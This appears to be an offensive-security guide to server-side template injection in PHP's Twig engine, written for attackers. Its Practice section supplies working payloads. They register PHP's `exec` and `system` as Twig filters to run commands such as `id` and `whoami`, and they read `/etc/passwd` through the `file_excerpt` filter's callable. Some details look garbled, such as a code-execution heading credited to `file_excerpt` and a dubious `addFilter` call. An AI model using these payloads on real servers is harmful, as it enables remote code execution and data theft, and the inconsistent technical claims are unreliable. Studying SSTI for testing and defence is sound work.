---
title: 'Twig Exploitation: Mastering Template Injection'
description: Explore the intricacies of Twig exploitation to achieve command execution
  and file inclusion using template injection techniques.
keywords:
- Twig exploitation
- template injection
- remote code execution
- file inclusion
- PHP security
- Symfony vulnerabilities
- Twig filters
- server-side template injection
---

# Twig Exploitation

## Context

In this guide, we focus on exploiting Twig, a PHP-based template engine commonly used in Symfony applications and other frameworks. Offensive operators will learn how to identify and exploit Twig template injection vulnerabilities to achieve remote code execution or unauthorized information disclosure. The reader is expected to have knowledge of template engines, server-side rendering, PHP syntax, and general server-side template injection (SSTI) concepts.

## Theory

### Twig Template Engine Internals

Twig is a flexible, fast, and secure template engine for PHP. It is integral to applications like Symfony, where it processes server-side templates to produce dynamic web pages. While designed to abstract logic from presentation, misuse or improper security configurations can lead to vulnerabilities. Rendering user inputs directly into Twig templates without adequate sanitation is a common vulnerability model that attackers exploit to execute code or access sensitive data.

### Twig Expression Syntax and Attack Surface

Twig expressions are encapsulated in double curly braces `{{ }}` for variable output purposes, while logic control structures are enclosed with `{% %}`. The attack surface arises when attackers can inject Twig expressions into the template context. Despite Twig's restrictions on direct PHP function invocation, attackers often bypass these limitations by exploiting lesser-known objects or filters within the Twig environment.

### Critical Twig Objects and Filters for Exploitation

Several objects and filters within Twig can be repurposed for malicious activities.

- `{{ _self }}`: Accesses the current template object exposing internal functionalities.
- `{{ _self.env }}`: Provides access to the Twig environment, offering deeper interaction opportunities, often used as a pivot for further exploitation.
- Filters like `file_excerpt` may allow file inclusion, and under certain conditions, facilitate remote command execution.

### Twig RCE and File Inclusion Vectors

Exploitation strategies typically involve leveraging vulnerable objects or filters to execute system commands or perform file operations. Implementation flaws, such as misconfigured sandboxes or custom filters, can inadvertently restore access to dangerous PHP functions that are generally restricted. Maintaining awareness of these vectors is key to successful exploitation and overall campaign resilience.

## Practice

### Twig Code Execution via file_excerpt Filter

In Twig, the environment can be manipulated to inject custom functionalities via its filters. Below are steps to achieve RCE through filter abuse:

- **Injection to Register `exec`:**

    ```jinja
    {{ _self.env.registerUndefinedFilterCallback('exec') }}
    ```

    This statement sets up `exec` as a filter callback, effectively enabling command execution capabilities through Twig filter syntax.

- **Execute 'id' Command:**

    ```jinja
    {{ ['id']|filter('exec') }}
    ```

    This filter invocation executes the `id` command on the server, showcasing proof of concept for remote code execution.

### Twig File Inclusion via file_excerpt

Misuse of `file_excerpt` can allow attackers to read important system files:

- **Read Sensitive Files:**

    ```jinja
    {{ _self.env.getFilter('file_excerpt').getCallable()('/etc/passwd', 1) }}
    ```

    Using the `file_excerpt` filter, sensitive files such as `/etc/passwd` can be exposed, emphasizing data access through variable reference exploitation.

### Twig RCE via Custom Filter Injection

Custom filters can be added to escalate the exploit:

- **Custom Filter for System Execution:**

    ```jinja
    {{ _self.env.addFilter(name='evil', filter=constant('system')) }}
    ```

    With this payload, a filter connecting to PHP's `system()` function is injected into the Twig environment.

- **Command Execution:**

    ```jinja
    {{ 'whoami'|evil }}
    ```

    This command uses the malicious 'evil' filter to execute `whoami`, demonstrating remote code execution capabilities.

## Tools

- **Burp Suite**
- **curl**

The above tools are essential for testing and exploiting SSTI vulnerabilities in real-world applications.